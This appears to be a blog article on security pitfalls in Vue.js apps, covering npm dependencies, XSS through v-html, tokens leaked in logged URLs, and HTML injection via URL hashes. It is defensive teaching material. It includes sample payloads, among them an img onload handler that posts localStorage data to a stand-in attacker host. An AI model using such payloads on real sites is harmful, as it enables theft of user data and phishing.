Vue offers a set of tools and APIs that help enhance the User Experience of your website, it's the developer who has to make sure how not to misuse these tools and open up his business to attackers.\n\n## Third-party libraries and Scripts\n\n<img src=\"/images/articles/node-modules.webp\" alt=\"Node modules are big\" />\n\nThe most common entry point in your application is your package.json file. It should have a disclaimer at the top that says:\n\n*Attention! Here be dragons!*\n\nYou usually want to use a popular framework or add a cool new library to your project and when you do you are potentially opening the door to malicious content.\n\nWith a simple `npm i amazing-library@2.0` even if amazing-library does not have any vulnerabilities, the installer will download the library's own dependencies and install them as well, and again for each dependency of that dependency and so on.\n\nThankfully npm provides an audit of every installed package and it gives a score of `low` / `medium` / `high` to each vulnerability it finds.\n\nYou then can run `npm audit fix` or `npm audit fix --force` to attempt to fix your installed packages. I want to stress the word attempt because in the Javascript world [things are not so simple](https://twitter.com/neciudan/status/1625800147757064193).\n\n\n<img src=\"/images/articles/twitter.webp\" alt=\"Security in Javascript\" />\n\n\nGitHub also has a vulnerability checker called [dependaBot](https://github.com/dependabot), that checks each PR for new updates or if you are introducing a library/package that is vulnerable.\n\nUnfortunately, npm and dependaBot, catch these problems only *after* packages have been flagged as vulnerable. So by the time you update your package.json file, it may already be too late.\n\nA couple of best practices when installing libraries:\n\n- check if the library/package is well maintained\n- do regular checks using npm audit for your package.json\n- install dependaBot in your GitHub repos\n\nObviously, this is not Vue.js specific and it affects every library and framework, the good news here is that [Vue core members take security very seriously](https://vuejs.org/guide/best-practices/security.html#best-practices) and I consider the Vue ecosystem to be safer than most.\n\nSo if you stick with Vue packages from the Vue ecosystem (Vue, Vite, Vitest, VueUse, etc), chances are you are probably safe.\n\n## Cross-Site Scripting (XSS)\n\n<img src=\"/images/articles/xss.webp\" alt=\"XSS explained\" /> \n\nCross-Site Scripting or XSS has been in the [OWASP Top Ten](https://owasp.org/www-project-top-ten/) every year for the past decade, and in 2022 has reached the third position.\n\n*Uhhh hooray for XSS ?*\n\nAn XSS vulnerability happens when an attacker manages to inject malicious code inside an application.\n\nThis malicious script is then executed by the Normal Users browser and the code can access cookie data, local storage, or other browser-related information.\n\nA typical example is a Comment Form Component rendered inside an Article. An attacker would add a comment like:\n\n```\n<script>alert('XSS')</script>\n```\nWhen other users would open the article, if the article is rendered in an element, the script would execute.\n\n```\n<p v-html=\"comment\"></p>`\n```\nTypically you would do this when you want users to be able to add markdown to their comments or the ability to bold certain words.\n\nNow, Vue is pretty smart in detecting script tags and prevents them by default. Unfortunately, attackers rarely use them, instead, they usually do something like this.\n\n\n```\nThis is a comment!\n\n<img \n  src=\"https://twitter.com/img/profile.jpg\" \n  style=\"display:none\" \n  onload=\"alert('XSS')\"\n/>\n```\nInside the onload or onerrormethods the attacker would make a fetch request and send the user entire cookies or local storage.\n\n```\n<img \n  src=\"https://twitter.com/img/profile.jpg\"\n  style=\"display:none\" \n  onload=\"fetch('https://attacker-url.net/', {method: 'POST', body: localStorage.getItem('account')})\"\n>\n```\nPretty scary, right?\n\nThe good news is that it’s totally avoidable. The recommended solution is to not use `v-html` for user-generated content. That way we all sleep better at night.\n\nBut if you absolutely must use it, for some reason only you and your corporate overlords know, you must sanitize the user input.\n\n[Sanitise-html](https://www.npmjs.com/package/sanitize-html) is a popular library that handles this well.\n\nAnother best practice is to also validate proper user input on the backend side and prevent malicious code from reaching the DB.\n\n## Security Logging\n\n<img src=\"/images/articles/o11y.webp\" alt=\"Observability\" /> \n\n**We measure everything.**\n\nPage views, clicks, events, errors, how much the user is scrolling, heatmaps, and all sorts of user-related data that we can use to determine if what we are building actually works.\n\nAnd unfortunately, we sometimes might send a little too much.\n\nTypically we use third-party SaaS tools like Datadog, New Relic, Google Analytics, or any number of observability tools.\n\nThat means that every security vulnerability we send from our front-end client is stored in a database that you have no control over.\n\n**What Security Vulnerabilities are we sending?**\n\nThe most common vulnerable data we are sending is:\n\n- reset password tokens\n- promo codes\n- checkout generated links\n\nWhy does this happen? Because we are using query params in the URL for sensitive data.\n\n```\nhttps://your-website.com/reset-password?token=AXSNNm123\n```\n\nWhen this happens, our third-party o11y library of choice will log this URL as visited.\n\nIf an attacker gets access to your logged data, they can use these tokens to hijack user accounts or get access to unused promo codes, or visit checkout links and get access to user card information.\n\nTo prevent this it’s recommended to not use query params and use hashes instead.\n\n```\nhttps://your-website.com/reset-password#token=AXSNm123\n```\n\nHashes are normally not logged or persisted in observability tools.\n\nMost importantly: it is recommended you audit your URLs and pages to make sure you do not show user data on public pages.\n\nFor example:\n\n```\nhttps://your-website.com/order/1231233212\n```\n\nIf this URL is accessed by someone other than the User who created the order, we must not show sensitive data like card information or the user's address.\n\n## Spoofing\n\n<img src=\"/images/articles/spoofing.webp\" alt=\"Spoofing\" /> \n\nPhishing and Spoofing have gotten very creative over the years.\n\nAnd while both employ similar tactics to achieve their result, to take the user to their own website and try to steal their password or information, they achieve this in different ways.\n\nPhishing would fake an official email and inside the call to action, they will redirect you to their own website.\n\nI cannot even count the number of fake Jira Emails or AWS Emails I have received trying to make me click and steal my password.\n\nNormally email clients catch this and all you have to do is be vigilant: check the sender, the content, and that the link you are going to has the correct domain name.\n\nSpoofing on the other hand is way more dangerous because it takes advantage of your website's flaw to redirect you to another website.\n\nThink of a page where you can add promo codes. You would probably send marketing emails to your users with an URL like:\n\n```\nhttps://your-website/promos#PROMO300\n```\n\nAnd on the page show the promo code in a nice way with an APPLY PROMO button.\n\nIn your code, you may grab the promo code using `location.hash` and then render it using the `v-html` tag.\n\nBy using the `v-html` tag in this situation you have opened up the Spoofing vulnerability.\n\nA creative attacker can create a very nice-looking HTML using your URL like this:\n\n```\nhttps://your-website/promos#<div>PROMO is APXS1230 <br/> <a href=\"https://other-malicious-website.com\">Click here to apply</a></div>\n```\n\nOf course the above looks malicious, but encoded it will look like this:\n\n```\nhttps://your-website/promos#%3Cdiv%3EPROMO%20is%20APXS1230%20%3Cbr%2F%3E%20%3Ca%20href%3D%22https%3A%2F%2Fother-malicious-website.com%22%3EClick%20here%20to%20apply%3C%2Fa%3E%3C%2Fdiv%3E\n```\n\nNot that easy to spot it now, is it?\n\nThe attacker will take advantage of the sense of security your users will feel when on your website and not think twice about clicking on a link.\n\nSpecifically on promotions-related pages.\n\nLike in the case of XSS the best approach is to never use v-html or {{}} to render user content or content from the URL / Cookies or another medium the attacker can exploit.\n\n## Conclusion\n\nTo minimize the risk of security vulnerabilities, it’s important to follow best practices, such as validating user input, using encryption for sensitive data, and implementing proper access controls.\n\nAdditionally, implementing security logging and monitoring can help detect and respond to potential security threats. As well as activating dependency checks in your pipeline (npm audit, dependabot)\n\nAnd the best advice comes from the Vue Documentation page itself:\n\n<img src=\"/images/articles/warning.webp\" alt=\"Warning\" /> \n\nAlways sanitize user input and try not to render using v-html anything that can be abused by attackers (URLs, Cookies, User Generated Content)\n\n";
